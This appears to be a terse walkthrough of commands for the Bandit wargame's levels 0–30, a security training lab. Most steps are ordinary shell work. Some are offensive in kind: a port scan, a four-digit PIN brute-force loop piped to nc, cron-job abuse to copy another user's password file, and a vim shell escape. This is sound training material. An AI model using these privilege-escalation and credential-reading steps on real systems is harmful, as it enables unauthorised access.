### 0 -> 1

cat readme

### 1 -> 2

cat ./-

### 2 -> 3

cat 'spaces in this filename'

### 3 -> 4

cat ./inhere/.hidden

### 4 -> 5

file ./inhere/-file*

### 5 -> 6

find * -type f -size 1033c  -exec ls {} -la \;

find * -type f -size 1033c  -exec cat {}  \;

### 6 -> 7

find / -size 33c -user bandit7 -group bandit6  -exec ls {} -la \; 2>/dev/null

find / -size 33c -user bandit7 -group bandit6  -exec cat {}  \; 2>/dev/null

### 7 -> 8

cat data.txt | grep millionth

### 8 -> 9

cat data.txt | sort | uniq -c

### 9 -> 10

cat data.txt | strings | grep ==

### 10 -> 11

cat data.txt | base64 -d

### 11 -> 12

cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'

### 12 -> 13

xxd -r data.txt /tmp/myname123/my/data

file data

mv data data2.bin.gz

gunzip data2.bin.gz

file data2.bin

...

### 13 -> 14

ssh -i ./sshkey.private bandit14@localhost

### 14 -> 15

telnet localhost 30000

### 15 -> 16

openssl

s_client -connect localhost:30001

### 16 -> 17

nmap -p 31000-32000 localhost

openssl

s_client -connect localhost:31790

ssh -i %file_with_RSA_private_key% bandit17@localhost

### 17 -> 18

diff -c passwords.new passwords.old

### 18 -> 19

ssh -t bandit18@localhost cat readme

### 19 -> 20

./bandit20-do cat /etc/bandit_pass/...

### 20 -> 21

tmux 

echo ... | nc localhost -l -p 5555

./suconnect 5555

### 21 -> 22

ls -lah /etc/cron.d

cat /etc/cron.d/cronjob_bandit22

ls -lah /usr/bin/...

cat /usr/bin/...

cat /tmp/...

### 22 -> 23

ls -lah /etc/cron.d

cat /etc/cron.d/cronjob_bandit23

ls -lah /usr/bin/...

cat /usr/bin/...

... | md5sum

cat /tmp/...

### 23 -> 24

ls -lah /etc/cron.d

cat /etc/cron.d/cronjob_bandit23

ls -lah /usr/bin/...

cat /usr/bin/...

create bash %script% in /var/spool/bandit24 for copy password from /etc/bandit_pass/bandit24 to %file%

do not forget to exec chmod 777 %script% and %file%

WAIT!!!

## 24 -> 25

write bash script like this

pass=...

for i in {0..9}{0..9}{0..9}{0..9}

do

  echo $pass $i

  echo $pass $i >> /tmp/my24/key.txt

  echo >> /tmp/my24/key.txt

  echo $pass $i | nc localhost 30002 >> /tmp/my24/key.txt

done

then grep /tmp/my24/key.txt

## 25 -> 26

cat /etc/passwd | grep bandit26

resize window

ssh -i bandit26.sshkey bandit26@localhost

press v

enter :e /etc/bandit_pass/bandit26

## 26 -> 27

resize window

ssh -i bandit26.sshkey bandit26@localhost

press v

:set shell=/bin/bash

:shell

ls -lah

./bandit27-do cat /etc/bandit_pass/...

## 27 -> 28

mkdir /tmp/my27; cd /tmp/my27

git clone ssh://bandit27-git@localhost/home/bandit27-git/repo

cat README

## 28 -> 29

mkdir /tmp/my28; cd /tmp/my28

git clone ssh://bandit28-git@localhost/home/bandit28-git/repo

git log

git log -p -1

## 29 -> 30

mkdir /tmp/my29; cd /tmp/my29

git clone ssh://bandit29-git@localhost/home/bandit29-git/repo

git log

git branch

git branch -r

git checkout %branch_name%

git log -p -1